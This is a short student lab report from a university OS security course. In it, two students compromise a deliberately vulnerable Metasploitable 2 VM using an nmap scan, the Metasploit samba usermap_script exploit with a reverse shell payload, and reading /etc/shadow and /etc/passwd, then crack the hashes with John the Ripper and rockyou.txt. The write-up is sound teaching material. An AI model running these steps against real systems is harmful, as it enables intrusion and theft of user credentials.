# Lab 4 - OS Security

> Pair Assignment
>
> Igor Mpore (i.mpore@innopolis.university)
>
> Ahmed Nouralla (a.shaaban@innopolis.university)



<u>Target Machine</u>: Metasploitable 2 on Ahmed's host machine

<u>Attacker</u>: Igor's machine

## Part 1: Setting up the environment

First of all, we made sure that both machines are in the same network and then assigned them with static ips using this command:

```bash
sudo ip addr add <ip> dev eth0
```

The target machine had **10.0.0.4** and the attacker's machine had  **10.0.0.3** . Now, we proceed with preparing the target machine

### Target Machine

On the target machine, the VM was set using the tutorial from [this link](https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/).  We used QEMU to set up our VM from [this tutorial](https://www.christitus.com/vm-setup-in-linux). After everything was ready, then the target machine was done and proceeded on trying to exploit it using <u>Metasploit Framework</u>

<u>**Metaspoit Network**</u>: The Metasploit Project is a computer security project that provides information about security vulnerabilities and aids in penetration testing and IDS signature development. More details can be found [here](https://www.metasploit.com/)

### Attacker's Machine

The attacker's machine already had Kali Linux installed and MSF was already installed and ready. 

## Part 2: Exploitation

Not we proceeded checking the open ports using nmap command (port scanning nmap commands can be found [here](https://www.stationx.net/nmap-cheat-sheet/)):

```bash
nmap 10.0.0.4 -A
```

Eventhough we did the port scanning, we already knew that samba was running on port 139 which we will be exploiting.

```bash
use exploit/multi/samba/usermap_script
set RHOST 10.0.0.4
set LHOST 10.1.1.3
set PAYLOAD /cmd/unix/reverse
exploit
```

![image-20220213200814522](/home/koala/.config/Typora/typora-user-images/image-20220213200814522.png)

After using the exploit command, the reverse TCP handler was already open on the target machine and it was ready for further exploitation.

Here are the steps followed next:

- Run `cat /etc/shadow` and copy output to attacker machine in file named shadow

- Run `cat /etc/passwd` and copy output to attacker machine in file named pass

- Run `unshadow pass shadow > unshadow` to combine the two files into `unshadow` file

- Downloaded `rockyou.txt` password list from [here](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt) 

- We then Used john the ripper to crack the passwords by running `john --wordlist=rockyou.txt unshadow`

- here is the screenshot of results:

   ![image-20220213202027879](/home/koala/.config/Typora/typora-user-images/image-20220213202027879.png)

That's all for this exercise.